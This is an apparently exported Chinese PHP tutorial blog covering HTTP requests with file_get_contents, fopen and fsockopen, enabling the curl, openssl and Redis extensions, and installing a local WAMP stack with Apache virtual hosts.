<h5 id="模拟POST请求"><a href="#模拟POST请求" class="headerlink" title="模拟POST请求"></a>模拟POST请求</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    $data = array(</span><br><span class="line">        &apos;name&apos; =&gt; &apos;mzt&apos;,</span><br><span class="line">        &apos;number&apos; =&gt; &apos;7&apos;</span><br><span class="line">    );  //要发送的post数据</span><br><span class="line">    $url = &apos;http://www.wyu.cn/&apos;;  //要抓取的url</span><br><span class="line"></span><br><span class="line">    $post_data = http_build_query($data);  //url-encode编码要post的数据</span><br><span class="line"></span><br><span class="line">    $options = array(</span><br><span class="line">        &apos;http&apos; =&gt; array(</span><br><span class="line">            &apos;method&apos; =&gt; &apos;POST&apos;,  //POST请求的方法</span><br><span class="line">            &apos;request_fulluri&apos;=&gt; true,</span><br><span class="line">            &apos;header&apos; =&gt; array(&quot;Accept-language: en&quot;,</span><br><span class="line">                &quot;Content-type: application/x-www-form-urlencoded&quot;,</span><br><span class="line">                &quot;user_agent: Opera/9.80 (Windows NT 6.1; U; en) Presto/2.8.131 Version/11.11&quot;,</span><br><span class="line">                &quot;cookie: aaa=aaa&quot;),  //POST请求的头部，Content-type固定，其他可改</span><br><span class="line">            //&apos;proxy&apos; =&gt; &apos;tcp://127.0.0.1:22716&apos;,  //只支持HTTP代理</span><br><span class="line">            &apos;content&apos; =&gt; $post_data,  //POST的主体，也即POST的数据</span><br><span class="line">            &apos;timeout&apos; =&gt; 5)  //超时时间</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    $options = stream_context_create($options);  //对要传输的数据进行流式处理</span><br><span class="line">    $html = file_get_contents($url,false,$options);  //POST情况下第三个参数要设置</span><br><span class="line">    echo $html;</span><br><span class="line">    </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>测试数据是否POST成功<ul>
<li>test.php</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    $data = $_POST;</span><br><span class="line">    echo &apos;&lt;pre&gt;&apos;;</span><br><span class="line">    print_r( $data );</span><br><span class="line">    echo &apos;&lt;/pre&gt;&apos;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>修改url为test.php的路径</li>
<li>查看是否有输出结果</li>
</ul>
<h3 id="0X02-fopen"><a href="#0X02-fopen" class="headerlink" title="0X02 fopen"></a>0X02 fopen</h3><h5 id="stream-get-meta-data-函数"><a href="#stream-get-meta-data-函数" class="headerlink" title="stream_get_meta_data()函数"></a>stream_get_meta_data()函数</h5><ul>
<li>官方手册：<a href="https://www.php.net/manual/zh/function.stream-get-meta-data" target="_blank" rel="noopener">https://www.php.net/manual/zh/function.stream-get-meta-data</a></li>
<li>从封装协议文件指针中取得报头／元数据</li>
<li>▲ 需是从 fopen()，fsockopen() 和 pfsockopen() 建立的流，返回的是一个数组</li>
</ul>
<h5 id="模拟GET请求-1"><a href="#模拟GET请求-1" class="headerlink" title="模拟GET请求"></a>模拟GET请求</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    $url = &apos;http://www.wyu.cn/&apos;;  //要抓取的url</span><br><span class="line">    $fp = fopen($url, &apos;r&apos;);  //以fopen的形式打开url</span><br><span class="line">    stream_get_meta_data($fp);  //转换数据为流</span><br><span class="line">    $result = &apos;&apos;;</span><br><span class="line">    while(!feof($fp))  //feof()判断文件指针是否到文件底部</span><br><span class="line">    &#123;</span><br><span class="line">        $result .= fgets($fp, 1024);  //取出拿到的数据放在字符串中</span><br><span class="line">    &#125;</span><br><span class="line">    echo $result;  //输出</span><br><span class="line">    fclose($fp);  //关闭文件指针</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="0X03-fsockopen"><a href="#0X03-fsockopen" class="headerlink" title="0X03 fsockopen"></a>0X03 fsockopen</h3><h5 id="fsockopen-函数"><a href="#fsockopen-函数" class="headerlink" title="fsockopen()函数"></a>fsockopen()函数</h5><ul>
<li>打开一个网络连接或者一个Unix套接字连接</li>
<li>官方手册：<a href="https://www.php.net/manual/zh/function.fsockopen.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/function.fsockopen.php</a></li>
<li>▲ 2020.03.16 能定制任意的连接，但作为网络抓取的成果是不理想的。若要做网络抓取，需要写完整的http请求并定制回送的http请求</li>
<li>▲ 2020.03.16 存在waf，很难发送正常的数据</li>
</ul>
<h5 id="parse-url-函数"><a href="#parse-url-函数" class="headerlink" title="parse_url()函数"></a>parse_url()函数</h5><ul>
<li>解析一个URL并返回一个关联数组，包含在 URL 中出现的各种组成部分</li>
<li>官方手册：<a href="https://www.php.net/manual/zh/function.parse-url.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/function.parse-url.php</a></li>
<li>▲ 2020.03.16 此函数对其他url中未有的参数不会进行默认设置</li>
</ul>
<h5 id="模拟GET请求-2"><a href="#模拟GET请求-2" class="headerlink" title="模拟GET请求"></a>模拟GET请求</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    $url = array(&apos;host&apos; =&gt; &apos;www.wyu.cn&apos;, &apos;port&apos; =&gt; &apos;80&apos;,&apos;path&apos; =&gt; &apos;&apos;,&apos;query&apos;=&gt; &apos;/&apos; ,&apos;cookie&apos; =&gt; &apos;/&apos;);  //请求的url数组</span><br><span class="line">    $fp = fsockopen($url[&apos;host&apos;],$url[&apos;port&apos;],$errno,$errstr,10);  //打开一个sock连接</span><br><span class="line">    $fp = fsockopen(&quot;ssl://&quot;.$url[&apos;host&apos;],$url[&apos;port&apos;],$errno,$errstr,10);</span><br><span class="line">    //对https连接的支持</span><br><span class="line"></span><br><span class="line">    if(!$fp)</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;$errstr ($errno)&lt;/br&gt;\n&quot;;  //如果文件指针不存在，就输出报错</span><br><span class="line">    &#125;else</span><br><span class="line">    &#123;</span><br><span class="line">        $out = &quot;GET /$url[path] HTTP/1.1\r\n&quot;;</span><br><span class="line">        $out.= &quot;Host: 61.160.224.50:80\r\n&quot;;</span><br><span class="line">        $out.= &quot;User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0\r\n&quot;;</span><br><span class="line">        $out.= &quot;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n&quot;;</span><br><span class="line">        $out.= &quot;Connection: keep-alive\r\n\r\n&quot;;</span><br><span class="line">        fwrite($fp,$out);  //将http的头写入文件指针</span><br><span class="line">        while(!feof($fp))  //feof()判断文件指针是否到文件底部</span><br><span class="line">        &#123;</span><br><span class="line">            echo fgets($fp,1024);  //取出拿到的数据放在字符串中</span><br><span class="line">        &#125;</span><br><span class="line">        fclose($fp);  //关闭文件指针</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h5 id="模拟POST请求-1"><a href="#模拟POST请求-1" class="headerlink" title="模拟POST请求"></a>模拟POST请求</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    $url = &apos;http://www.wyu.cn&apos;;  //要抓取的url</span><br><span class="line">    $url_info = parse_url($url);  //对url进行字段解析</span><br><span class="line"></span><br><span class="line">    $fp = fsockopen($url_info[&apos;host&apos;],80,$errno,$errstr,10);  ////打开一个sock连接</span><br><span class="line"></span><br><span class="line">    $data = array(</span><br><span class="line">        &apos;name&apos; =&gt; &apos;mzt&apos;,</span><br><span class="line">        &apos;number&apos; =&gt; &apos;7&apos;</span><br><span class="line">    );  //要发送的post数据</span><br><span class="line"></span><br><span class="line">    $post_data = http_build_query($data);  //url-encode编码要post的数据</span><br><span class="line"></span><br><span class="line">    if(!$fp)</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;$errstr ($errno)&lt;/br&gt;\n&quot;;  //如果文件指针不存在，就输出报错</span><br><span class="line">    &#125;else</span><br><span class="line">    &#123;</span><br><span class="line">        $out = &quot;POST &quot;.$url_info[&apos;path&apos;].&quot; HTTP/1.1\r\n&quot;;</span><br><span class="line">        $out.= &quot;Host: &quot;.$url_info[&apos;host&apos;].&quot;\r\n&quot;;</span><br><span class="line">        $out.= &quot;Content-type: application/x-www-form-urlencodedn&quot;;</span><br><span class="line">        $out.= &quot;User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0\r\n&quot;;</span><br><span class="line">        $out.= &quot;Connection: keep-alive\r\n\r\n&quot;;</span><br><span class="line">        $out.= &quot;$post_data\r\n&quot;;</span><br><span class="line">        fwrite($fp,$out);  //将http的头写入文件指针</span><br><span class="line">        while(!feof($fp))  //feof()判断文件指针是否到文件底部</span><br><span class="line">        &#123;</span><br><span class="line">            echo fgets($fp,1024);  //取出拿到的数据放在字符串中</span><br><span class="line">        &#125;</span><br><span class="line">        fclose($fp);  //关闭文件指针</span><br><span class="line">    &#125;  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>


]]></content>
      <categories>
        <category>PHP</category>
      </categories>
  </entry>
  <entry>
    <title>php的扩展</title>
    <url>/2020/07/12/php_extension/</url>
    <content><![CDATA[<hr>
<h2 id="php的扩展"><a href="#php的扩展" class="headerlink" title="php的扩展"></a>php的扩展</h2><ul>
<li>CURL扩展</li>
<li>openssl扩展</li>
<li>Redis以及扩展<ul>
<li>Redis For Winodow</li>
<li>Redis For Linux</li>
<li>Redis操作手册</li>
</ul>
</li>
</ul>
<h3 id="0X00-CURL扩展"><a href="#0X00-CURL扩展" class="headerlink" title="0X00 CURL扩展"></a>0X00 CURL扩展</h3><ul>
<li>▲ 2020.03.15 网上看到了很多关于Window环境开启curl的方法，但都存在一定问题</li>
<li>php开启扩展（php.ini）<ul>
<li>extension=curl</li>
</ul>
</li>
<li>▲ curl加载：找到对应php目录下libssh2.dll文件，复制到对应apache的bin文件夹下</li>
<li>重启Apache，查看phpinfo，是否有Curl</li>
<li>php_curl_test.php</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">     var_dump(curl_init());  //输出为 resource(2) of type (curl) </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/php/php_extension/curl_install.png" alt="CURL_install"></p>
<h3 id="0x01-openssl扩展"><a href="#0x01-openssl扩展" class="headerlink" title="0x01 openssl扩展"></a>0x01 openssl扩展</h3><ul>
<li>▲ 对于现在大多数网站来说，都是https模式，爬虫需要开启openssl扩展建立连接</li>
<li>php开启扩展（php.ini文件）<ul>
<li>extension=php_openssl</li>
</ul>
</li>
</ul>
<p><img src="/images/php/php_extension/openssl_install.png" alt="openssl_install"></p>
<h3 id="0X02-Redis以及扩展"><a href="#0X02-Redis以及扩展" class="headerlink" title="0X02 Redis以及扩展"></a>0X02 Redis以及扩展</h3><h5 id="Redis-For-Winodow"><a href="#Redis-For-Winodow" class="headerlink" title="Redis For Winodow"></a>Redis For Winodow</h5><ul>
<li>▲ 2020.03.15 Redis for Window官方已经停止维护</li>
<li>▲ Redis默认端口为6379，默认密码为空密码</li>
<li>Redis废弃函数替换：<a href="https://blog.csdn.net/xchenhao/article/details/97251618" target="_blank" rel="noopener">https://blog.csdn.net/xchenhao/article/details/97251618</a></li>
<li>Redis -&gt; Github的维护仓库：<a href="https://github.com/microsoftarchive/redis/releases" target="_blank" rel="noopener">https://github.com/microsoftarchive/redis/releases</a></li>
<li>Redis官方文档 -&gt; for window <a href="https://www.redis.com.cn/redis-installation" target="_blank" rel="noopener">https://www.redis.com.cn/redis-installation</a></li>
<li>Redis扩展 -&gt; pecl的维护仓库：<a href="http://pecl.php.net/package/redis" target="_blank" rel="noopener">http://pecl.php.net/package/redis</a></li>
<li>Pecl仓库下载 -&gt; <a href="https://windows.php.net/downloads/pecl/" target="_blank" rel="noopener">https://windows.php.net/downloads/pecl/</a></li>
<li>下载Redis.msi安装文件，下载Redis扩展（对应PHP版本）</li>
<li>拷贝redis的扩展php_redis.dll -&gt; php/ext</li>
<li>php开启扩展（php.ini文件）<ul>
<li>extension=php_redis.dll</li>
</ul>
</li>
<li>重启Apache，查看phpinfo，是否有Redis</li>
<li>window_php_redis_test.php</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">     $redis = new Redis();                   //redis对象</span><br><span class="line">     $redis-&gt;connect(&quot;127.0.0.1&quot;,&quot;6379&quot;); //连接redis服务器</span><br><span class="line">     $redis-&gt;set(&quot;test&quot;,&quot;Hello World&quot;);      //set字符串值</span><br><span class="line">     echo $redis-&gt;get(&quot;test&quot;);               //获取值</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/php/php_extension/redis_for_window.png" alt="redis_for_windows"></p>
<h5 id="Redis-For-Linux"><a href="#Redis-For-Linux" class="headerlink" title="Redis For Linux"></a>Redis For Linux</h5><ul>
<li>Redis安装：<a href="https://redis.io/" target="_blank" rel="noopener">https://redis.io/</a> （自安装灵活性较大）</li>
<li>php的redis扩展：<a href="https://github.com/phpredis/phpredis/releases" target="_blank" rel="noopener">https://github.com/phpredis/phpredis/releases</a></li>
<li>安装redis扩展</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tar xzf phpredis-xxx.tar.gz</span><br><span class="line">cd phpredis </span><br><span class="line">sudo phpize </span><br><span class="line">sudo ./configure </span><br><span class="line">sudo make </span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>

<ul>
<li>将modules文件夹的内容复制并粘贴到PHP扩展目录中，并在php.ini中添加以下行<ul>
<li><code>extension = redis.so</code> </li>
</ul>
</li>
<li>linux_php_redis_test.php</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $redis = new Redis(); </span><br><span class="line">    $redis-&gt;connect(&apos;127.0.0.1&apos;, 6379); </span><br><span class="line">    echo &quot;Server is running: &quot;.$redis-&gt;ping();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/php/php_extension/redis_for_linux.png" alt="redis_for_linux"></p>
<h5 id="Redis操作手册"><a href="#Redis操作手册" class="headerlink" title="Redis操作手册"></a>Redis操作手册</h5><ul>
<li>phpredis：<a href="https://github.com/phpredis/phpredis" target="_blank" rel="noopener">https://github.com/phpredis/phpredis</a></li>
</ul>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
  </entry>
  <entry>
    <title>搭建wamp和域名服务</title>
    <url>/2020/07/12/wamp_dns/</url>
    <content><![CDATA[<hr>
<h2 id="搭建wamp和域名服务"><a href="#搭建wamp和域名服务" class="headerlink" title="搭建wamp和域名服务"></a>搭建wamp和域名服务</h2><ul>
<li>WAMP环境</li>
<li>安装Apache</li>
<li>安装PHP</li>
<li>MySQL安装</li>
<li>搭建域名</li>
<li>搭建虚拟主机<ul>
<li>基于IP的虚拟主机</li>
<li>基于端口的虚拟主机</li>
<li>基于域名的虚拟主机</li>
<li>注意</li>
</ul>
</li>
</ul>
<h3 id="0X00-WAMP环境"><a href="#0X00-WAMP环境" class="headerlink" title="0X00 WAMP环境"></a>0X00 WAMP环境</h3><ul>
<li>环境搭建路径不能为中文，可以集中在一个sever目录下</li>
<li>Apache：httpd-2.4.41-o111c-x64-vc15-r2<ul>
<li>2.4.41–版本号</li>
<li>x64–对应系统平台</li>
<li>vc15–编译平台</li>
</ul>
</li>
<li>PHP：php-7.4.3-Win32-vc15-x64<ul>
<li>x64–对应系统平台</li>
<li>7.4.3–版本号</li>
<li>vc15–编译平台</li>
</ul>
</li>
<li>MySQL：mysql5.5<ul>
<li>5.5–版本号</li>
</ul>
</li>
</ul>
<p><img src="/images/php/php-notepad/server%E7%9B%AE%E5%BD%95.png" alt="server目录"></p>
<h3 id="0X01-安装Apache"><a href="#0X01-安装Apache" class="headerlink" title="0X01 安装Apache"></a>0X01 安装Apache</h3><ul>
<li>Apache httpd：<a href="https://www.apachehaus.com/cgi-bin/download.plx" target="_blank" rel="noopener">https://www.apachehaus.com/cgi-bin/download.plx</a><ul>
<li>根据系统版本选择对应的Apache httpd服务</li>
<li>▲ 从Apache官网下载相应的源码，现在比较难以找到msi安装包</li>
</ul>
</li>
<li>安装<ul>
<li>▲ 目录路径不可为中文</li>
<li>将文件解压到新建的server目录，命名为Apache</li>
<li>测试服务：cmd -&gt; httpd.exe -t<ul>
<li>新解压的Apache服务会报错误，需要Define SRVROOT，更改为Apache的绝对路径</li>
<li>测试成功：Syntax OK</li>
</ul>
</li>
<li>安装：cmd -&gt; httpd.exe -K install<ul>
<li>若无报错信息，则可以在Apache Service Monitor启动Apache服务</li>
</ul>
</li>
<li>查看使用的模块：cmd -&gt; httpd.exe -M<ul>
<li><static>：静态加载，Apache启动就加载好，可以直接使用</li>
<li><shared>：动态加载，在使用到的时候才会加载</li>
</ul>
</li>
</ul>
</li>
<li>目录说明<ul>
<li>bin/cgi-bin：windows下的一些可执行文件</li>
<li>conf：配置文件目录</li>
<li>htdocs：Apache默认的主机地址（网站根目录）</li>
<li>modules：Apache的功能化模块</li>
</ul>
</li>
<li>配置站点<ul>
<li>▲ 配置文件：httpd.conf -&gt; 自定义SRVROOT</li>
<li>网站文件夹所在位置：DocumentRoot/ServerRoot “${SRVROOT}/htdocs”</li>
<li>使用名字访问网站：ServerName localhost</li>
<li>端口监听：Listen 80</li>
</ul>
</li>
<li>⭐ 每次动到配置文件，可通过httpd.exe -t去测试是否配置编译错误</li>
<li>▲ 凡是涉及到Apache配置文件的修改，都需要重启Apache才能生效</li>
<li>▲ 实现DNS域名解析：修改hosts文件 -&gt; 127.0.0.1  localhost</li>
<li>▲ 可在系统环境变量的PATH中加载httpd.exe的路径</li>
<li>浏览器访问localhost，看是否能成功访问到</li>
</ul>
<p><img src="/images/php/php-notepad/Apache%E5%AE%89%E8%A3%85%E6%88%90%E5%8A%9F.png" alt="Apache安装成功"></p>
<h3 id="0X02-安装PHP"><a href="#0X02-安装PHP" class="headerlink" title="0X02 安装PHP"></a>0X02 安装PHP</h3><ul>
<li>PHP：<a href="https://windows.php.net/download#php-7.4" target="_blank" rel="noopener">https://windows.php.net/download#php-7.4</a><ul>
<li>根据系统版本选择对应的PHP服务</li>
<li>根据Apache选择对应的编译环境</li>
<li>选择Thread Safe线程安全的形式</li>
</ul>
</li>
<li>安装<ul>
<li>▲ 目录路径不可为中文</li>
<li>将文件解压到新建的server目录，命名为PHP7.4.3</li>
<li>可通过php.exe运行命令来指定要解析的PHP脚本 -&gt; php.exe  -f  PHP文件所在路径的index.php文件 -&gt; hello world</li>
</ul>
</li>
<li>目录说明<ul>
<li>ext：扩展包-&gt;PHP很多功能是通过加载扩展来实现</li>
<li>php7apache2_4.dll：Apache支持包</li>
<li>php.exe：PHP解释器</li>
</ul>
</li>
<li>配置Apache加载PHP模块<ul>
<li>▲ 配置Apache文件：httpd.conf</li>
<li>Apache加载PHP模块：在Apache的主配置文件中加载对应的PHP提供的模块<ul>
<li>LoadModule php7_module PHP所提供的模块链接所在路径</li>
</ul>
</li>
<li>Apache分配工作给PHP模块：如果是PHP代码就交给PHP处理–文件后缀判断<ul>
<li>AddType application/x-httpd-php .php</li>
</ul>
</li>
<li>将PHP的配置文件加载到Apache配置文件中<ul>
<li>PHPIniDir php.ini所在路径</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><img src="/images/php/php-notepad/%E9%85%8D%E7%BD%AEApache%E5%8A%A0%E8%BD%BDPHP%E6%A8%A1%E5%9D%97.png" alt="配置Apache加载PHP模块"></p>
<ul>
<li>配置文件<ul>
<li>php.ini文件默认是不存在的，是以development存在，复制一份，修改命名为php.ini</li>
</ul>
</li>
<li>测试<ul>
<li>新建一个index.php文件</li>
<li>浏览器访问localhost/index.php</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    phpinfo();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/php/php-notepad/PHP%E5%AE%89%E8%A3%85%E6%88%90%E5%8A%9F.png" alt="PHP安装成功"></p>
<h3 id="0X03-MySQL安装"><a href="#0X03-MySQL安装" class="headerlink" title="0X03 MySQL安装"></a>0X03 MySQL安装</h3><ul>
<li>MySQL：<a href="https://www.mysql.com/downloads/" target="_blank" rel="noopener">https://www.mysql.com/downloads/</a><ul>
<li>根据系统版本选择对应的MySQL服务</li>
<li>安装mysql一般安装5.x版本，7.x版本为一定程度的阉割版</li>
</ul>
</li>
<li>安装<ul>
<li>Custome：自定义安装（选择安装路径）<ul>
<li>MySQL Server -&gt; server/mysql</li>
<li>Server data files -&gt; server/mysql/data</li>
</ul>
</li>
<li>Launch the MySQL Instance Configuration Wizard：配置<ul>
<li>Please select a configuration -&gt; Detailed Configuration：详细配置</li>
<li>Please select a server type -&gt; Developer Machine：开发环境</li>
<li>Please select the database usage -&gt; Multifunctional Database：多功能</li>
<li>Please set the approximate number of cocurrent connections to the server -&gt; Manual Setting(15):并发设置</li>
<li>Please set the networking options<ul>
<li>Enable TCP/IP Networking  -&gt; 允许TCP/IP协议访问<ul>
<li>Prot Number -&gt; 3306</li>
<li>Add firewall exception for this port -&gt; 防火墙通过</li>
</ul>
</li>
<li>Enable Strict Mode -&gt; 使用严格模式</li>
</ul>
</li>
<li>Please select the default set -&gt; Manual Selected Default Character Set / Collation:字符集设定 -&gt; utf8</li>
<li>Please set the Windows options <ul>
<li>Install As Windows Service：服务安装<ul>
<li>Service Name：MySQL</li>
<li>Launch the MySQL Server automatically：随系统启动</li>
</ul>
</li>
<li>Include Bin Directory in Windows PATH：讲MySQL加到系统路径</li>
</ul>
</li>
<li>Please set the security options<ul>
<li>Modify security settings<ul>
<li>New root password -&gt; root</li>
<li>Confirm -&gt; root</li>
<li>Enable root access from remote machines：允许远程访问</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><img src="/images/php/php-notepad/MySQL%E5%AE%89%E8%A3%85%E6%88%90%E5%8A%9F.png" alt="MySQL安装成功"></p>
<ul>
<li>目录说明<ul>
<li>bin：执行文件夹<ul>
<li>mysql.exe：访问MySQL服务器的客户端</li>
<li>mysqld.exe：MySQL服务</li>
<li>mysqldump.exe：MySQL的备份软件客户端</li>
</ul>
</li>
<li>data：数据存储文件夹</li>
<li>lib：核心文件夹</li>
<li>my.ini：配置文件</li>
</ul>
</li>
<li>测试mysql服务<ul>
<li>cmd -&gt; mysql -u root -p</li>
<li>参数<ul>
<li>-h：主机地址</li>
<li>-p：端口</li>
<li>-u：用户名</li>
<li>-p：密码</li>
</ul>
</li>
</ul>
</li>
<li>PHP连接MySQL数据库<ul>
<li>▲ 配置php文件：php.ini</li>
<li>PHP的扩展都是在ext文件夹中，需要制定扩展所在路径：extension_dir=”/server/php7.4.3/ext”</li>
<li>开启sqli扩展：extension=mysqli</li>
<li>开启pdo_mysql扩展：extension=pdo_mysql</li>
</ul>
</li>
</ul>
<p><img src="/images/php/php-notepad/PHP%E8%BF%9E%E6%8E%A5MySQL%E6%95%B0%E6%8D%AE%E5%BA%93.png" alt="PHP连接MySQL数据库"></p>
<ul>
<li>测试PHP连接mysql<ul>
<li>新建一个testmysql.php文件</li>
<li>浏览器访问localhost/testmysql.py，查看是否出现OK！</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $link=mysqli_connect(&apos;localhost&apos;,&apos;root&apos;,&apos;root&apos;);</span><br><span class="line">    if(!$link) echo &quot;Error !&quot;;</span><br><span class="line">    else echo &quot;Ok!&quot;;</span><br><span class="line">    mysqli_close($link);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/php/php-notepad/phpinfo--mysqli.png" alt="phpinfo--mysqli"></p>
<p><img src="/images/php/php-notepad/phpinfo--pdo_mysql.png" alt="phpinfo--pdo_mysql"></p>
<h3 id="0X04-搭建域名"><a href="#0X04-搭建域名" class="headerlink" title="0X04 搭建域名"></a>0X04 搭建域名</h3><ul>
<li>修改hosts文件 -&gt; 127.0.0.1  localhost</li>
</ul>
<h3 id="0X05-搭建虚拟主机"><a href="#0X05-搭建虚拟主机" class="headerlink" title="0X05 搭建虚拟主机"></a>0X05 搭建虚拟主机</h3><ul>
<li>官方解释文档：<a href="http://httpd.apache.org/docs/current/vhosts/" target="_blank" rel="noopener">http://httpd.apache.org/docs/current/vhosts/</a></li>
<li>配置虚拟主机方式<ul>
<li>基于IP</li>
<li>基于主机名</li>
<li>基于端口</li>
</ul>
</li>
<li>实验环境<ul>
<li>在Apache下的htdocs目录中，新建两个目录，test1和test2<ul>
<li>test1目录下1.php（<?php phpinfo(); ?>）</li>
<li>test2目录下2.php（<?php echo "OKKKK" ?>）</li>
<li>▲ 2020.03.05在查询资料的过程中，有遇到test目录可以建立在htdocs的情况，但实操发现不行</li>
</ul>
</li>
<li>本地模拟外网域名，在hosts文件中配置两个测试域名<ul>
<li>127.0.0.1 <a href="http://www.test1mzt.com" target="_blank" rel="noopener">www.test1mzt.com</a></li>
<li>127.0.0.1 <a href="http://www.test2mzt.com" target="_blank" rel="noopener">www.test2mzt.com</a></li>
</ul>
</li>
<li>修改配置（Apache24\conf\httpd.conf）<ul>
<li>#Virtual hosts -&gt; Include conf/extra/httpd-vhosts.conf</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><img src="/images/php/php-notepad/%E8%99%9A%E6%8B%9F%E4%B8%BB%E6%9C%BAhosts%E6%96%87%E4%BB%B6%E8%AE%BE%E7%BD%AE.png" alt="虚拟主机hosts文件设置"></p>
<h5 id="基于IP的虚拟主机"><a href="#基于IP的虚拟主机" class="headerlink" title="基于IP的虚拟主机"></a>基于IP的虚拟主机</h5><ul>
<li>基于IP，一台服务器有多个网卡，每个IP绑定一个站点的方式</li>
<li>▲ 基于IP的方式，写在VirtualHost的IP地址需要可被路由</li>
<li>▲ 在下图，有多种访问方式访问test2下的2.php<ul>
<li>127.0.0.2:80/2.php</li>
<li><a href="http://www.test2mzt.com:80/2.php" target="_blank" rel="noopener">www.test2mzt.com:80/2.php</a></li>
<li><a href="http://www.test2mzt.com/2.php" target="_blank" rel="noopener">www.test2mzt.com/2.php</a></li>
</ul>
</li>
</ul>
<p><img src="/images/php/php-notepad/%E5%9F%BA%E4%BA%8EIP%E7%9A%84%E8%99%9A%E6%8B%9F%E4%B8%BB%E6%9C%BA.png" alt="基于IP的虚拟主机"></p>
<h5 id="基于端口的虚拟主机"><a href="#基于端口的虚拟主机" class="headerlink" title="基于端口的虚拟主机"></a>基于端口的虚拟主机</h5><ul>
<li>修改配置文件将原来的：Listen 80改为Listen 80 Listen 88</li>
<li>▲ 基于端口的方式，需要在httpd.conf的配置文件中增加监听端口</li>
<li>▲ 在下图，有多种访问方式访问test2下的2.php<ul>
<li>127.0.0.1:88/2.php</li>
<li><a href="http://www.test2mzt.com:88/2.php" target="_blank" rel="noopener">www.test2mzt.com:88/2.php</a></li>
</ul>
</li>
</ul>
<p><img src="/images/php/php-notepad/%E5%9F%BA%E4%BA%8E%E7%AB%AF%E5%8F%A3%E7%9A%84%E8%99%9A%E6%8B%9F%E4%B8%BB%E6%9C%BA.png" alt="基于端口的虚拟主机"></p>
<h5 id="基于域名的虚拟主机"><a href="#基于域名的虚拟主机" class="headerlink" title="基于域名的虚拟主机"></a>基于域名的虚拟主机</h5><ul>
<li>基于主机名也就是基于域名方式访问，每个IP多个站点</li>
<li>▲ 基于域名的方式，需要在hosts文件中指定域名</li>
<li>▲ 在下图，有多种访问方式访问test2下的2.php<ul>
<li>127.0.0.1/2.php</li>
<li><a href="http://www.test2mzt.com/2.php" target="_blank" rel="noopener">www.test2mzt.com/2.php</a></li>
</ul>
</li>
</ul>
<p><img src="/images/php/php-notepad/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E5%90%8D%E7%9A%84%E8%99%9A%E6%8B%9F%E4%B8%BB%E6%9C%BA.png" alt="基于域名的虚拟主机"></p>
<h5 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h5><ul>
<li><Directory>目录报错<ul>
<li>▲ 2020.03.05 Apache启动报Invalid command ‘order’, perhaps misspelled or defined by a module not included的错误<ul>
<li>Apache2.4以上，做了修改</li>
<li>在LoadMoudle中，需要通过access_compat_module modules/mod_access_compat.so和actions_module modules/mod_actions.so模块，才能使用”Order、Deny、Allow”写配置文件</li>
<li>若不通过access_compat_module modules/mod_access_compat.so更改，可以使用Apache Require命令</li>
</ul>
</li>
</ul>
</li>
<li>需要给当前设定的站点（目录）访问权限</li>
</ul>
